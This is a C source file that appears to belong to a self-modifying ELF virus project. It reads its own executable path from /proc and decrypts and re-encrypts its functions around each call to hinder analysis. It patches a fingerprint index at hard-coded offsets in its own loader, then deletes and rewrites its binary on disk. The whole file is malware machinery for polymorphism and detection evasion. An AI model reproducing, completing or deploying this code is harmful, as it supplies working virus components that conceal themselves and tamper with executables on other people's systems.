#include  "death.h"

void	get_path_own_file(char *buf, t_info *info)
{
	char	path_sym[PATH_MAX];
	pid_t	pid;

	ft_memset(path_sym, PATH_MAX, '\0');
	write_proc(path_sym);
	pid = ft_sysgetpid();
	uint32_t key = decrypt_func(info, &itoa, info->tab_addr[12 + 1] - info->tab_addr[12], 12);
	itoa(buf, pid);
	reencrypt_func(info, &itoa, info->tab_addr[12 + 1] - info->tab_addr[12], key);
	ft_strcat(path_sym, buf);
	write_exe(buf);
	ft_strcat(path_sym, buf);
	ft_sysreadlink(path_sym, buf, PATH_MAX);
}

void	rewrite_own_file(char *path, void *file, size_t size, int fd, struct stat st)
{
	ft_sysclose(fd);
	if (ft_sysunlink(path) < 0)
		return ;
	if ((fd = ft_sysopenmode(path, O_RDWR | O_CREAT, st.st_mode)) < 0)
		return ;
	ft_syswrite(fd, file, size);
	ft_sysclose(fd);
}

void		update_own_index(t_fingerprint *fingerprint, t_info *info)
{
	char			path[PATH_MAX];
	struct stat		st;
	void			*file;
	int			fd;
	size_t			base_entry;
	void			*addr;
	Elf64_Phdr		*header;
	uint32_t		new_index;

	ft_memset(path, PATH_MAX, '\0');
	uint32_t key = decrypt_func(info, &get_path_own_file, info->tab_addr[18] - info->tab_addr[17], 17);
	get_path_own_file(path, info);
	reencrypt_func(info, &get_path_own_file, info->tab_addr[18] - info->tab_addr[17], key);

	if ((fd = ft_sysopen(path, O_RDONLY)) < 0)
		return ;
	ft_sysfstat(fd, &st);
	if ((file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		goto end_close;
	base_entry = ((Elf64_Ehdr *)(file))->e_entry;
	header = (Elf64_Phdr *)(file + sizeof(Elf64_Ehdr));
	while (header)
	{
		if ((header->p_type == PT_LOAD) && (base_entry > header->p_vaddr) && (base_entry < header->p_vaddr + header->p_memsz))
		{
			addr = file + header->p_offset + header->p_memsz;
			break ;
		}
		header++;
	}
	if (*((uint32_t *)(file + /*I*/0x87f/*I`*/)) == 0xffffffff) // pos -1 dans loader
		addr = (file + /*J*/0x753/*J`*/); // offset index dans loader
	else
		addr = addr - SIGN_SIZE - 8 - 5;
	if (*((uint32_t *)(addr)) > fingerprint->index)
		fingerprint->index = *((uint32_t *)(addr));
	new_index = fingerprint->index + fingerprint->fingerprint;
	ft_memcpy(addr, &new_index, 4);
	key = decrypt_func(info, &rewrite_own_file, info->tab_addr[19] - info->tab_addr[18], 18);
	rewrite_own_file(path, file, st.st_size, fd, st);
	reencrypt_func(info, &rewrite_own_file, info->tab_addr[19] - info->tab_addr[18], key);
	ft_sysmunmap(file, st.st_size);
end_close:
	ft_sysclose(fd);
	return ;
}
